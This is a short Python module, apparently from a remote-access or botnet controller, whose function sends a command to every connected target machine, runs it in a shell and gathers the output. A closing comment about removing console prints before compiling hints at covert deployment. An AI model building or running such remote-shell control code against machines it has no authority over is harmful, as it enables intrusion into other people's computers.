import config as config


def shell(server, command):
    """
    Pops a shell and send commands to the selected clients
    :param server: Server socket object
    :param command: CMD command to operate
    """
    # Lets the client know that he's about to receive shell commands.
    for target in config.targets:
        config.send_to_client(server, target, 'shell', response=False)

    # Sends shell commands.
    output = ''
    for target in config.targets:
        output = output + '\nClient #' + str(target+1) + ':\n'
        response = config.send_to_client(server, target, command)
        output = output + response
    return output

# Notes:
# Delete custom console + prints before compiling
